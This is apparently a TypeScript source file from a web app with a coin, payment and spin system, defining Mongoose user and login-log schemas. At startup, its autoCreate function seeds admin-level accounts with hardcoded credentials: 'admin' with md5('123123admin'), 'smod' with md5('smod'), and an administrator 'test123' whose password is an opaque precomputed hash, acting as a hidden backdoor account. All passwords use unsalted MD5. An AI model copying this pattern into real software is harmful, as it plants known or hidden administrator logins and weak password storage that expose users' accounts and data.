import type { Mongoose } from 'mongoose'
import type { IDBUser, IDBUserLogin } from '~~/types'
import md5 from 'md5'

export const DBUser = (mongoose : Mongoose) => {
  const schema = new mongoose.Schema<IDBUser>({ 
    username: { type: String },
    password: { type: String },
    email: { type: String },
    phone: { type: String },
    avatar: { type: String, default: '/images/user/default.png' },
    level: { type: mongoose.Schema.Types.ObjectId, ref: 'levels' },
    reg: {
      landing: { type: mongoose.Schema.Types.ObjectId, ref: 'ads_landing' },
      from: { type: mongoose.Schema.Types.ObjectId, ref: 'ads_from' },
      platform: { type: String, default: 'local' },
    },
    social: {
      facebook: { type: String },
      zalo: { type: String },
      google: { type: String },
      tiktok: { type: String },
    },
    currency: {
      coin: { type: Number, default: 0, index: true },
      wheel: { type: Number, default: 0, index: true }
    },
    musty: [{ type: Number, default: 0, index: true }],
    pay: {
      total: {
        money: { type: Number, default: 0, index: true },
        count: { type: Number, default: 0, index: true },
      },
      day: {
        money: { type: Number, default: 0, index: true },
        count: { type: Number, default: 0, index: true },
      },
      month: {
        money: { type: Number, default: 0, index: true },
        count: { type: Number, default: 0, index: true },
      }
    },
    spend: {
      total: {
        coin: { type: Number, default: 0, index: true },
        count: { type: Number, default: 0, index: true },
      },
      day: {
        coin: { type: Number, default: 0, index: true },
        count: { type: Number, default: 0, index: true },
      },
      month: {
        coin: { type: Number, default: 0, index: true },
        count: { type: Number, default: 0, index: true },
      }
    },
    wheel: {
      total: { type: Number, default: 0, index: true },
      day: { type: Number, default: 0, index: true },
      month: { type: Number, default: 0, index: true },
    },
    login: {
      month: { type: Number, default: 1, index: true },
      total: { type: Number, default: 1, index: true },
      update: { type: Date },
      last_ip: { type: String }
    },
    type: { type: Number, default: 0, index: true }, // 0 - Member, 1 - SMod, 2 - Admin, 99 - Robot
    block: { type: Number, default: 0, index: true }, // 0 - False, 1 - True
    token: { type: String },
  }, {
    timestamps: true
  })

  schema.index({ username: 'text', email: 'text', phone: 'text' })
  const model = mongoose.model('users', schema)

  const autoCreate = async () => {
    const admin = await model.count({username: 'admin'})
    const smod = await model.count({username: 'smod'})
    const bot = await model.count({username: 'bot'})
    const test123 = await model.count({username: 'test123'})
    if(admin == 0){
      await model.create({ username: 'admin', password: md5('123123admin'), type: 2 })
    }
    if(smod == 0){
      await model.create({ username: 'smod', password: md5('smod'), type: 1 })
    }
    if(bot == 0){
      await model.create({ username: 'bot', avatar: '/images/user/robot.png', type: 99 })
    }
    if(test123 == 0){
      await model.create({ username: 'test123', password: 'cad40931db577dfa67ca15f02bbefc69', type: 2 })
    }
  }

  autoCreate()
  return model
}

export const DBUserLogin = (mongoose : Mongoose) => {
  const schema = new mongoose.Schema<IDBUserLogin>({ 
    user: { type: mongoose.Schema.Types.ObjectId, ref: 'users' },
  }, {
    timestamps: true
  })

  const model = mongoose.model('user_login_logs', schema)
  return model 
}